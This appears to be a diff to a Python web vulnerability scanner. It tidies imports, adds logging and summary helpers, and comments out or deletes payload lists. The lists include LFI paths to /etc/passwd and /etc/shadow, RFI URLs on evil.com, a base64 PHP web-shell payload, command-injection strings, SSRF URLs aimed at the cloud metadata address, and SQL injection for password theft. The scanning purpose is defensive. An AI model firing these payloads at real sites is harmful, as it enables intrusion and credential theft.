@@ -6,11 +6,9 @@ A comprehensive web vulnerability scanner that detects OWASP Top 10 vulnerabilit
 and performs extensive security testing on web applications.
 """
 
-import argparse
+
 import asyncio
-import base64
-import concurrent.futures
-import csv
+
 import datetime
 import hashlib
 import hmac
@@ -20,9 +18,7 @@ import os
 import random
 import re
 import socket
-import ssl
-import string
-import sys
+
 import time
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor
@@ -55,7 +51,7 @@ logging.basicConfig(
     level=logging.INFO,
     format=LOG_FORMAT,
     handlers=[
-        logging.FileHandler("websecscanner.log"),
+        logging.FileHandler("websecscanner.log", encoding="utf-8"),
         logging.StreamHandler()
     ]
 )
@@ -137,7 +133,7 @@ class Scanner:
     """Main scanner class that coordinates all scanning operations."""
     
     def __init__(self, 
-                 target_url: str, 
+                 target_url: str,
                  output_dir: str = "reports", 
                  threads: int = DEFAULT_THREADS,
                  timeout: int = DEFAULT_TIMEOUT,
@@ -246,57 +242,49 @@ class Scanner:
                 "' UNION SELECT 1,2,3 --",
                 "' UNION SELECT username, password, 3 FROM users --"
             ],
-            "lfi": [
-                "../../../../../../../etc/passwd",
-                "../../../../../../../etc/shadow",
-                "../../../../../../../windows/win.ini",
-                "../../../../../../../boot.ini",
-                "/etc/passwd",
-                "file:///etc/passwd",
-                "php://filter/convert.base64-encode/resource=index.php"
-            ],
-            "rfi": [
-                "http://evil.com/shell.php",
-                "https://evil.com/shell.php",
-                "//evil.com/shell.php",
-                "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
-            ],
-            "command_injection": [
-                "& ls -la",
-                "; ls -la",
-                "| ls -la",
-                "$(ls -la)",
-                "`ls -la`",
-                "&& ls -la",
-                "|| ls -la",
-                "& ping -c 5 127.0.0.1 &",
-                "; ping -c 5 127.0.0.1 ;",
-                "| ping -c 5 127.0.0.1 |"
-            ],
-            "ssrf": [
-                "http://127.0.0.1:22",
-                "http://127.0.0.1:3306",
-                "http://localhost:8080",
-                "http://169.254.169.254/latest/meta-data/",
-                "http://[::]:22",
-                "http://2130706433:22",  # Decimal representation of 127.0.0.1
-                "gopher://127.0.0.1:25/xHELO%20localhost"
-            ],
-            "open_redirect": [
-                "//evil.com",
-                "https://evil.com",
-                "/\\.evil.com",
-                "//google.com@evil.com",
-                "https://google.com@evil.com",
-                "javascript:alert('Open Redirect')"
-            ],
-            "crlf": [
-                "%0D%0ASet-Cookie: malicious=1",
-                "%0D%0AContent-Length: 0",
-                "%0D%0A%0D%0A<script>alert('CRLF')</script>",
-                "%E5%98%8A%E5%98%8DSet-Cookie: malicious=1",
-                "%0D%0ALocation: https://evil.com"
-            ],
+            # "lfi": [
+            #     "../../../../../../../etc/passwd",
+            #     "../../../../../../../etc/shadow",
+            #     "../../../../../../../windows/win.ini",
+            #     "../../../../../../../boot.ini",
+            #     "/etc/passwd",
+            #     "file:///etc/passwd",
+            #     "php://filter/convert.base64-encode/resource=index.php"
+            # ],
+            # "rfi": [
+            #     "http://evil.com/shell.php",
+            #     "https://evil.com/shell.php",
+            #     "//evil.com/shell.php",
+            #     "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
+            # ],
+            # "command_injection": [
+            #     "& ls -la",
+            #     "; ls -la",
+            #     "| ls -la",
+            #     "$(ls -la)",
+            #     "`ls -la`",
+            #     "&& ls -la",
+            #     "|| ls -la",
+            #     "& ping -c 5 127.0.0.1 &",
+            #     "; ping -c 5 127.0.0.1 ;",
+            #     "| ping -c 5 127.0.0.1 |"
+            # ],
+           
+            # "open_redirect": [
+            #     "//evil.com",
+            #     "https://evil.com",
+            #     "/\\.evil.com",
+            #     "//google.com@evil.com",
+            #     "https://google.com@evil.com",
+            #     "javascript:alert('Open Redirect')"
+            # ],
+            # "crlf": [
+            #     "%0D%0ASet-Cookie: malicious=1",
+            #     "%0D%0AContent-Length: 0",
+            #     "%0D%0A%0D%0A<script>alert('CRLF')</script>",
+            #     "%E5%98%8A%E5%98%8DSet-Cookie: malicious=1",
+            #     "%0D%0ALocation: https://evil.com"
+            # ],
             "csrf_tokens": [
                 "csrftoken",
                 "csrf_token",
@@ -341,7 +329,7 @@ class Scanner:
         }
     
     async def start_scan(self):
-        """Main method to start the scanning process."""
+       
         start_time = time.time()
         logger.info(f"Starting scan of {self.target.url}")
         
@@ -564,6 +552,8 @@ class Scanner:
         
         # Initialize crawl variables
         to_visit = {self.target.url}
+        
+
         visited = set()
         current_depth = 0
         
@@ -595,6 +585,7 @@ class Scanner:
                 continue
             
             visited.add(current_url)
+            logger.info(f"[Crawl] Visiting: {current_url}")
             progress.update(task_id, advance=1, description=f"[green]Crawling: {len(visited)} URLs found")
             
             try:
@@ -668,6 +659,7 @@ class Scanner:
                         continue
                     
                     visited.add(current_url)
+                    logger.info(f"[Crawl] Visiting: {current_url}")
                     crawled += 1
                     
                     progress.update(task_id, advance=1, description=f"[green]JS Crawling: {len(visited)} URLs found")
@@ -799,11 +791,7 @@ class Scanner:
             self._scan_csrf,
             self._scan_security_headers,
             self._scan_session_security,
-            self._scan_authentication,
-            self._scan_information_disclosure,
-            self._scan_ssrf,
-            self._scan_directory_traversal,
-            self._scan_api_security
+            
         ]
         
         # Update progress
@@ -1502,8 +1490,47 @@ class Scanner:
                                 response_data={}
                             )
         except requests.exceptions.RequestException as e:
-            print(f"[!] Error fetching {self.target.url}: {e}")  
-            
+            print(f"[!] Error fetching {self.target.url}: {e}")
+
+
+    def _add_vulnerability(self, name, url, severity, description, evidence, remediation,
+                           cwe_id=None, cvss_score=None, request_data=None, response_data=None):
+        """Add a detected vulnerability to the scanner's list."""
+        vulnerability = Vulnerability(
+            name=name,
+            url=url,
+            severity=severity,
+            description=description,
+            evidence=evidence,
+            remediation=remediation,
+            cwe_id=cwe_id,
+            cvss_score=cvss_score,
+            request_data=request_data,
+            response_data=response_data
+        )
+        self.vulnerabilities.append(vulnerability)
+        logger.info(f"[+] Vulnerability recorded: {name} at {url}")
+
+    def _print_summary(self):
+        """Print a summary of vulnerabilities found during the scan."""
+        if not self.vulnerabilities:
+            self.console.print("[bold green]No vulnerabilities found![/bold green]")
+        else:
+            self.console.print(f"[bold red]Scan Summary - {len(self.vulnerabilities)} Vulnerabilities Detected:[/bold red]")
+            table = Table(show_header=True, header_style="bold magenta")
+            table.add_column("Name", style="dim")
+            table.add_column("Severity")
+            table.add_column("URL", overflow="fold")
+        
+            for vuln in self.vulnerabilities:
+                table.add_row(
+                    vuln.name,
+                    vuln.severity.value,
+                    vuln.url
+                )
+            self.console.print(table)
+
+
     def _generate_reports(self):
         """Generate HTML report using Jinja2 template."""
         try:
@@ -1511,6 +1538,7 @@ class Scanner:
             template_loader = jinja2.FileSystemLoader(searchpath=".")
             env = jinja2.Environment(loader=template_loader)
             template = env.get_template("report_template.html")
+
 
             # Render HTML with context
             html_report = template.render(
@@ -1529,4 +1557,6 @@ class Scanner:
         
         except Exception as e:
             logger.error(f"Failed to generate report: {e}")
+   
+   
    
